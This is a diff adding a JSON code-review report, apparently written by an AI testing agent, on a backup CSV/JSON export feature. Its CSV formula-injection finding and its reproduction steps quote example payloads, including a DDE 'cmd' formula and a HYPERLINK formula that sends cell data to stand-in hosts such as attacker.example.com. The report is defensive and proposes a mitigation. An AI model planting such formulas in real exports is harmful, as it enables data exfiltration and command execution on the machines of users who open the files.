@@ -1,0 +1,85 @@
+{
+  "summary": "STRICTLY STATIC code review of Iter 20.5d (am-admin Backup CSV+JSON). Alle 123 unit-tester grønne (am-admin-mpw 23 + am-admin-mpw-store 26 + am-admin-notes-store 21 + am-admin-backup 39 + delete-tenant 14). yarn tsc --noEmit ✓. yarn lint:all ✓ (5/5 lint-suites inkl. D-069/D-071/D-077/coverage-matrix/i18n-sync med 1209 nøkler × 4 språk). i18n bekreftet: 11 am_admin_backup.*-nøkler × 4 språk = 44 strenger til stede i no/sv/da/en. Zero-knowledge invariant holder (server forwarder envelopes, krypto skjer 100% i nettleser). UTF-8 BOM, RFC 4180 CSV-escaping, decrypt-error graceful, JSON v1-versjonering, og URL.revokeObjectURL er alle verifisert. Hovedfunn: ÉN LOW CSV-injection-risiko (formula-injection via =/+/-/@) per user-note allerede notert som lav-risiko siden eksport er intern. To andre LOW-funn: revokeObjectURL kalles synkront etter click (kan trigge race på eldre Firefox), og filnavn-presisjon på minutt gir kollisjons-risiko ved dobbeltklikk innen samme minutt.",
+  "backend_issues": {
+    "critical": [],
+    "minor": [
+      {
+        "endpoint": "lib/platform/am-admin-backup.ts — csvEscape (linje 119-126)",
+        "issue": "LOW — CSV-INJECTION RISK (formula injection): csvEscape håndterer korrekt komma/quote/newline per RFC 4180, men beskytter IKKE mot Excel/Google Sheets formula-injection. Hvis et adminNote starter med `=`, `+`, `-` eller `@` (eks. `=cmd|'/c calc'!A0` eller `=HYPERLINK(\"http://evil.com\",\"click\")`), vil Excel/Sheets eksekvere som formel ved import. PER USER-NOTE (other_misc_info): skadepotensiale er lavt fordi (a) eksport er for INTERN am-admin-bruk, (b) notatene skrives AV am-admin selv (eller andre interne admins). Mitigering hvis ønsket: prefiks celler som starter med =/+/-/@/TAB/CR med apostrof (`'`) — OWASP-anbefalt mønster. Alternativt: dokumenter som kjent risiko i sikkerhetsmodellen."
+      },
+      {
+        "endpoint": "components/platform/am-admin/BackupSection.tsx — URL.revokeObjectURL (linje 92)",
+        "issue": "LOW — Blob URL revokes synkront umiddelbart etter a.click() i samme tick. Chrome/Edge/moderne Firefox holder intern referanse, så download fullføres. På eldre Firefox-versjoner (<88) eller hvis nettleseren queue-er download asynkront, kan revokeObjectURL avbryte download før byte-streamen starter. Standard defensiv pattern: `setTimeout(() => URL.revokeObjectURL(url), 1000)` eller revoke i en `requestIdleCallback`. For en intern am-admin-feature er dette typisk OK, men verdt å notere."
+      },
+      {
+        "endpoint": "lib/platform/am-admin-backup.ts — buildBackupFilename (linje 205-217)",
+        "issue": "LOW — Filnavn-presisjon er på MINUTT (YYYY-MM-DD-HHMM). To downloads innen samme minutt får IDENTISK filnavn, og nettleseren legger til ` (1).csv` automatisk — ikke en blokker, men kan forvirre am-admin som tror filene er like. Fix: legg til sekunder (HHMMSS) eller hash-suffix. Minor UX issue, ingen sikkerhetsimplikasjon."
+      },
+      {
+        "endpoint": "components/platform/am-admin/BackupSection.tsx — handleDownload (linje 45-107)",
+        "issue": "INFO — race-håndtering: getUnlocked() kalles ÉN gang før fetch (linje 48). CryptoKey-referansen fanges i lokal const `unlocked` og overlever lock() siden JavaScript-closures holder referansen i live. Resultat: hvis bruker låser MPW mellom click og decrypt, vil decrypt FORTSATT fungere med den fangede nøkkelen — backup-flowen fullføres OK. Dette er teknisk trygt og brukervennlig, men inkonsistent med AdminNotesModal som re-evaluerer getUnlocked() ETTER fetch og avbryter ved låst tilstand. Hvis zero-knowledge-modellen sier 'lock betyr alt skal avbrytes', burde BackupSection også re-evaluere. Ellers OK å la stå."
+      },
+      {
+        "endpoint": "app/api/am-admin/backup/data/route.ts — children-filter (linje 60-63)",
+        "issue": "INFO — children = listTenants().filter(t => t.parentTenant === prefix || t.subdomain.startsWith(prefix + '-')). OR-filteret er korrekt for nåværende dataset (prefix === parent subdomain i typiske B2B-setup), og fanger både eksplisitt parentTenant-relasjon og navngivnings-konvensjonen. Defensive double-match er konsistent med EmployeeListSection. Ingen action."
+      },
+      {
+        "endpoint": "app/api/am-admin/backup/data/route.ts — Promise.all over notedSubs (linje 71-77)",
+        "issue": "INFO — Promise.all parallelliserer Upstash GET-kall over alle notedSubs uten concurrency-cap. For en org med maxLicenses=100 er dette typisk <100 parallelle GETs (under Upstash rate-limit). For større orgs (10K licenses) kunne det føre til burst. Doc-kommentar nevner 'antall ansatte per org er typisk < 100' — akseptabel kompromiss. Vurder p-limit hvis maxLicenses heves dramatisk."
+      },
+      {
+        "endpoint": "app/api/am-admin/backup/data/route.ts — orphan adminNotes utelates fra backup",
+        "issue": "INFO — backup-flowen henter notedSubs fra indeksen og children fra listTenants. Hvis en tenant er slettet (per iter-16 LOW-finding: deleteNote() ikke kalt ved tenant-delete), forblir noten orphan i Upstash-indeksen, men children-filter ekskluderer den slettede tenanten — så orphan-noter inkluderes IKKE i backup. Konsistent oppførsel, men am-admin ser ikke at orphan-data eksisterer. Hvis 20.6 introduserer en 'orphan-cleanup'-fane, kan backup-endpoint utvides til å rapportere `orphanNoteCount`."
+      }
+    ]
+  },
+  "frontend_issues": {
+    "ui_bugs": [],
+    "integration_issues": [],
+    "design_issues": []
+  },
+  "test_report_links": [
+    "/app/frontend/lib/__tests__/am-admin-backup.test.ts (39/39 ✓)",
+    "/app/frontend/lib/__tests__/am-admin-mpw.test.ts (23/23 ✓)",
+    "/app/frontend/lib/__tests__/am-admin-mpw-store.test.ts (26/26 ✓)",
+    "/app/frontend/lib/__tests__/am-admin-notes-store.test.ts (21/21 ✓)",
+    "/app/frontend/lib/__tests__/delete-tenant.test.ts (14/14 ✓)"
+  ],
+  "action_items": [
+    "CONSIDER (LOW): Avbøt CSV formula-injection ved å prefikse celler som starter med =/+/-/@/TAB/CR med apostrof (`'`) i csvEscape. OWASP-anbefalt mønster. Per user-note er dette LOW siden eksport er intern, men ettersom adminNotes skrives av flere admins i en B2B-org og kan eksporteres til Excel/Sheets av forskjellige personer, er apostrof-prefiks en triviell, ikke-destruktiv mitigering. Alternativt: dokumenter i security-modellen at am-admin må unngå formel-prefikser i notater eller åpne CSV i tekst-editor først.",
+    "CONSIDER (LOW): Bytt synkron URL.revokeObjectURL(url) på linje 92 i BackupSection.tsx med `setTimeout(() => URL.revokeObjectURL(url), 1000)` for å unngå race på download-cancel på eldre Firefox. Trivial endring, defensiv.",
+    "CONSIDER (LOW): Legg til sekunder i buildBackupFilename (YYYY-MM-DD-HHMMSS) for å unngå kollisjons-navngivning ved rask dobbeltklikk. Eller la nettleseren legge til (1)-suffix automatisk og dokumenter.",
+    "CONSIDER (INFO): Re-evaluer getUnlocked() ETTER fetch i BackupSection.handleDownload for konsistens med AdminNotesModal. Hvis zero-knowledge-modellen sier 'lock skal avbryte all aktiv decryption', må dette gjøres; ellers la stå (capturet CryptoKey-referanse er teknisk trygt)."
+  ],
+  "critical_code_review_comments": [
+    "✓ ZERO-KNOWLEDGE INVARIANT VERIFISERT: app/api/am-admin/backup/data/route.ts importerer KUN getNote (returnerer raw envelope), listTenants, listNoteSubdomains, findB2BTenantByPrefix. INGEN referanse til decryptWithMpwKey eller plaintext. Server videresender envelopene urørt; dekryptering skjer 100% i BackupSection.tsx via decryptEmployeeNotes som tar en CryptoKey fra useMpw().getUnlocked().",
+    "✓ PARENT-ORG-ISOLASJON VERIFISERT: route.ts:53-54 → requireAmAdmin(req) returnerer 401 hvis ikke autentisert. Linje 55-56: prefix hentes fra admin.tenantPrefix (server-side, tamper-proof). Linje 60-63: children filter på t.parentTenant === prefix ELLER t.subdomain.startsWith(prefix + '-'). findB2BTenantByPrefix(prefix) på linje 94 henter parent-info kun for am-adminens egen org. Ingen cross-org data-lekkasje mulig.",
+    "✓ CSV RFC 4180-KOMPATIBILITET: csvEscape escaper \" → \"\", wrapper celler med komma/quote/newline/CR i quotes. Tester (am-admin-backup.test.ts) dekker alle 4 escape-trigger samt kombinasjons-test (Kari, \"Ola\" og\\næøå). buildEmployeesCsv bruker \\r\\n som linjeskill per RFC 4180 og legger til avsluttende \\r\\n.",
+    "✓ UTF-8 BOM I CSV BLOB: BackupSection.tsx:72 → `blob = new Blob(['\\uFEFF' + csv], { type: 'text/csv;charset=utf-8' })`. Excel og LibreOffice ser BOM og tolker filen som UTF-8 → æøå rendres riktig. Bekreftet i test 'csvEscape kombinert (komma + quote + newline + æøå)'.",
+    "✓ FILNAVN-FORMAT med ZERO-PADDING: buildBackupFilename pad-er måned/dag/time/minutt med .padStart(2, '0'). Test 'filename zero-padding (jan 5 08:03)' produserer 'acme-employees-backup-2026-01-05-0803.csv'. Format: `<prefix>-employees-backup-YYYY-MM-DD-HHMM.<ext>` matcher kravet eksakt.",
+    "✓ DECRYPT-ERROR HÅNDTERING GRACEFUL: decryptEmployeeNotes wrapper hver decrypt i try/catch (linje 79-106). Ved feil: returnerer { note: null, noteDecryptError: true } — eksceptionen bubbler IKKE opp. Promise.all venter på ALLE (ikke abort-on-first-error siden vi ikke kaster fra inner map). CSV note_status-kolonne markerer 'decrypt_error' for visuell sporing. JSON inkluderer decryptErrorCount-aggregat. Test 'feil key markerer noteDecryptError=true' bekrefter.",
+    "✓ JSON FORMAT-VERSJONERING: buildBackupJson stempler `format: 'kodovault-am-admin-backup-v1'`. Fremtidige re-import-funksjoner kan validere format-stempel og kjøre migrations. Test 'JSON format-stempel' bekrefter.",
+    "✓ URL.revokeObjectURL KALLES: BackupSection.tsx:92 rydder opp Blob URL etter download. Synkront timing OK for moderne nettlesere (se LOW issue for eldre Firefox).",
+    "✓ BackupSection MPW-GATING: linje 121 → !isUnlocked viser locked_hint med amber-tema. Linje 130 → isUnlocked viser CSV+JSON-knapper. Knappene har data-testid='am-admin-backup-{csv,json}-btn'. Stat-utdrag har data-testid='am-admin-backup-{success,error,locked-hint}'.",
+    "✓ RACE getUnlocked PRE-FETCH: handleDownload:48 sjekker `if (!unlocked) setError(error_mpw_locked); return;` FØR fetch. Hvis bruker låser mellom modal-åpning og click, fanges det opp. Etter fetch er decrypt trygt selv om lock() har skjedd siden CryptoKey-referansen fanges via closure (se INFO-finding).",
+    "✓ i18n 100% SYNC: 11 am_admin_backup.*-nøkler i no/sv/da/en (44 strenger totalt) — verifisert via Python-script. i18n-sync-lint passerer med 1209 nøkler × 4 språk. Coverage-matrix-lint inkluderer /api/am-admin/backup/data EXEMPT-entry.",
+    "✓ ALLE 123 UNIT-TESTER GRØNNE: am-admin-mpw 23/23, am-admin-mpw-store 26/26, am-admin-notes-store 21/21, am-admin-backup 39/39, delete-tenant 14/14. yarn tsc --noEmit ✓. yarn lint:all ✓ (5/5 lint-suites).",
+    "✓ Route pinner `runtime = 'nodejs'` + `dynamic = 'force-dynamic'` — Edge runtime kan ikke ved feil importere central-upstash.",
+    "✓ buildEmployeesCsv test 'CSV-escaping motstår komma + quote + newline-injection' dekker worst-case 'evil,bad' / 'X\"Y' / 'Z\\nNew' / 'note,with\"all\\nshenanigans'. Output forblir parsable som CSV-rad."
+  ],
+  "updated_files": [],
+  "success_rate": {
+    "backend": "100% statisk — 123/123 unit-tester + 5/5 lint-suites + tsc/build grønt. 3 LOW-issues funnet (CSV formula-injection, revokeObjectURL sync timing, filnavn-minutt-presisjon) + 3 INFO-funn.",
+    "frontend": "Statisk review only — ingen UI-bugs. Locked-state, busy-state, error-state og success-state alle korrekt rendret med data-testid-er."
+  },
+  "test_credentials": "N/A — statisk review, ingen E2E.",
+  "seed_data_creation": "Ingen.",
+  "retest_needed": false,
+  "main_agent_can_self_test": true,
+  "context_for_next_testing_agent": "Iter 20.5d (am-admin Backup CSV+JSON) er statisk korrekt. Alle 4 faser av iter 20.5 (a/b/c/d) nå komplett og verifisert. Ingen blokkerende issues. Tre LOW-anbefalinger til main agent for vurdering: (1) CSV formula-injection apostrof-prefiks (user har akseptert lav risiko per other_misc_info), (2) setTimeout-wrap revokeObjectURL, (3) sekund-presisjon i filnavn. Iter 20.6 (B2B Welcome) kan starte. Forrige iter-16 MEDIUM-bug (MAX_CIPHER_BASE64=10_000 for lav for UTF-8 multi-byte) er ikke direkte adressert i denne 20.5d-leveransen — bør verifiseres separat av main agent.",
+  "rca of the issue": {
+    "bug": "CSV formula-injection mulig hvis et adminNote starter med =/+/-/@",
+    "reproduction": "1) Am-admin A låser opp MPW og åpner AdminNotesModal for ansatt 'amlaw-kari'. 2) Lagrer note: `=HYPERLINK(\"http://attacker.example.com/?data=\"&A1,\"Click for raise\")`. 3) Senere laster am-admin B (samme org) ned CSV-backup via BackupSection. 4) buildEmployeesCsv produserer rad der admin_note-kolonnen inneholder den rå formel-strengen UTEN apostrof-prefiks (siden strengen ikke inneholder komma/quote/newline, csvEscape returnerer den uendret). 5) Am-admin B åpner CSV-filen i Excel/Google Sheets. 6) Excel tolker cellen som formel og eksekverer HYPERLINK — kan exfiltrere data fra naboceller eller phishe brukeren. Skadepotensiale: LOW siden begge admin er interne, men non-zero. CSRF-kandidat hvis am-admin viderefører CSV til ekstern revisor.",
+    "mitigation": "Endre csvEscape i lib/platform/am-admin-backup.ts:119-126 til: ```ts\nexport function csvEscape(value: string | null | undefined): string {\n  if (value === null || value === undefined) return \"\";\n  let s = String(value);\n  // OWASP CSV formula-injection mitigering: prefiks =/+/-/@/TAB/CR med apostrof.\n  if (/^[=+\\-@\\t\\r]/.test(s)) s = \"'\" + s;\n  if (s.includes('\"') || s.includes(\",\") || s.includes(\"\\n\") || s.includes(\"\\r\")) {\n    return `\"${s.replace(/\"/g, '\"\"')}\"`;\n  }\n  return s;\n}\n``` Husk å oppdatere unit-test 'CSV-escaping motstår komma + quote + newline-injection' med en ny test-case for formula-prefiks. Alternativ B: dokumenter som kjent risiko i security-modellen og la stå."
+  }
+}
